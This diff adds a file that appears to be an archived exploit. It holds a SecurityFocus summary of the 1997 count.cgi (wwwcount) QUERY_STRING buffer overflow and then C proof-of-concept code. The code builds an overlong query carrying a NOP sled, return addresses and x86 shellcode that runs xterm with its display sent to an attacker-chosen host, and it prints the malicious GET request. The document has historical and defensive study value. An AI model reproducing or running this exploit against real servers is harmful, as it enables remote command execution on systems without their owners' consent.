@@ -1,0 +1,178 @@
+source: http://www.securityfocus.com/bid/128/info
+
+Wwwcount (count.cgi) is a very popular CGI program used to track website usage. In particular, it enumerates the number of hits on given webpages and increments them on a 'counter'. In October of 1997 two remotely exploitable problems were discovered with this program. The first problem was somewhat innocuous in that it only allowed remote users to view .GIF files they were not supposed to have access to. This may be dangerous if the site contains sensitive data in .GIF files such as demographic/financial data in charts etc. 
+
+The second and most serious problem is a buffer overflow in QUERY_STRING enviroment variable handled by the program. In essence a remote user can send an overloy long query to the program and overflow a buffer in order to execute their own commands as whatever privelage level the program is running as.
+
+/*
+
+Count.cgi (wwwcount) linux test exploit
+(c) 05/1997 by plaguez - dube0866@eurobretagne.fr
+Contact me if you manage to improve this crap.
+
+This program needs drastic changes to be useable.
+If you can't understand how to modify it for your own purpose,
+please do not consider trying it.
+
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char shell[]=
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\xeb\x3c\x5e\x31\xc0\x89\xf1\x8d"
+"\x5e\x18\x88\x46\x2c\x88\x46\x30"
+"\x88\x46\x39\x88\x46\x4b\x8d\x56"
+"\x20\x89\x16\x8d\x56\x2d\x89\x56"
+"\x04\x8d\x56\x31\x89\x56\x08\x8d"
+"\x56\x3a\x89\x56\x0c\x8d\x56\x10"
+"\x89\x46\x10\xb0\x0b\xcd\x80\x31"
+"\xdb\x89\xd8\x40\xcd\x80\xe8\xbf"
+"\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff"
+"/usr/X11R6/bin/xterm0-ut0-display0"
+"127.000.000.001:00"
+"\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff\xff\xff\xff\xff\xff"
+"\xff\xff\xff";
+
+
+/*
+
+Assembly stuff for the previous buffer.
+This basically implements an execve syscall, by creating
+an array of char* (needs to put a null byte at the end of
+all strings).
+Here we gonna exec an xterm and send it to our host.
+(you can't simply exec a shell due to the cgi proto).
+
+jmp 60
+popl %esi
+xorl %eax,%eax # efface eax
+movl %esi,%ecx # recupere l'adresse du buffer
+leal 0x18(%esi),%ebx # recupere l'adresse des chaines
+movb %al,0x2c(%esi) # cree les chaines azt
+movb %al,0x30(%esi) #
+movb %al,0x39(%esi)
+movb %al,0x4b(%esi)
+leal 0x20(%esi),%edx # cree le char**
+movl %edx,(%esi)
+leal 0x2d(%esi),%edx
+movl %edx,0x4(%esi)
+leal 0x31(%esi),%edx
+movl %edx,0x8(%esi)
+leal 0x3a(%esi),%edx
+movl %edx,0xc(%esi)
+leal 0x10(%esi),%edx
+movl %eax,0x10(%esi)
+movb $0xb,%al
+int $0x80 # passe en mode kernel
+xorl %ebx,%ebx # termine proprement (exit())
+movl %ebx,%eax # si jamais le execve() foire.
+inc %eax #
+int $0x80 #
+call -65 # retourne au popl en empilant l'adresse de la chaine
+.byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
+.byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
+.byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
+.ascii \"/usr/X11R6/bin/xterm0\" # 44
+.ascii \"-ut0\" # 48
+.ascii \"-display0\" # 57 au ;
+.ascii \"127.000.000.001:00\" # 75 (total des chaines)
+.byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
+.byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
+...
+*/
+
+char qs[7000];
+char chaine[]="user=a";
+
+unsigned long getesp() {
+// asm("movl %esp,%eax");
+return 0xbfffee38;
+}
+
+void main(int argc, char **argv) {
+int compt;
+long stack;
+
+stack=getesp();
+
+if(argc>1)
+stack+=atoi(argv[1]);
+
+for(compt=0;compt<4104;compt+=4) {
+qs[compt+0] = stack & 0x000000ff;
+qs[compt+1] = (stack & 0x0000ff00) >> 8;
+qs[compt+2] = (stack & 0x00ff0000) >> 16;
+qs[compt+3] = (stack & 0xff000000) >> 24;
+}
+
+
+strcpy(qs,chaine);
+qs[strlen(chaine)]=0x90;
+
+qs[4104]= stack&0x000000ff;
+qs[4105]=(stack&0x0000ff00)>>8;
+qs[4106]=(stack&0x00ff0000)>>16;
+qs[4107]=(stack&0xff000000)>>24;
+qs[4108]= stack&0x000000ff;
+qs[4109]=(stack&0x0000ff00)>>8;
+qs[4110]=(stack&0x00ff0000)>>16;
+qs[4111]=(stack&0xff000000)>>24;
+qs[4112]= stack&0x000000ff;
+qs[4113]=(stack&0x0000ff00)>>8;
+qs[4114]=(stack&0x00ff0000)>>16;
+qs[4115]=(stack&0xff000000)>>24;
+qs[4116]= stack&0x000000ff;
+qs[4117]=(stack&0x0000ff00)>>8;
+qs[4118]=(stack&0x00ff0000)>>16;
+qs[4119]=(stack&0xff000000)>>24;
+qs[4120]= stack&0x000000ff;
+qs[4121]=(stack&0x0000ff00)>>8;
+qs[4122]=(stack&0x00ff0000)>>16;
+qs[4123]=(stack&0xff000000)>>24;
+qs[4124]= stack&0x000000ff;
+qs[4125]=(stack&0x0000ff00)>>8;
+qs[4126]=(stack&0x00ff0000)>>16;
+qs[4127]=(stack&0xff000000)>>24;
+qs[4128]= stack&0x000000ff;
+qs[4129]=(stack&0x0000ff00)>>8;
+qs[4130]=(stack&0x00ff0000)>>16;
+qs[4131]=(stack&0xff000000)>>24;
+
+strcpy((char*)&qs[4132],shell);
+
+/* Choose what to do here */
+printf("GET /cgi-bin/Count.cgi?%s\n\n",qs);
+/*fprintf(stderr,"\n\nadresse: %x0x\n",stack);
+printf("GET /cgi-bin/Count.cgi?%s HTTP/1.0\nUser-Agent: %x\n\n",qs,stack);
+setenv("QUERY_STRING",qs,1);
+system("/usr/local/etc/httpd/cgi-bin/Count.cgi");
+system("/bin/sh");*/
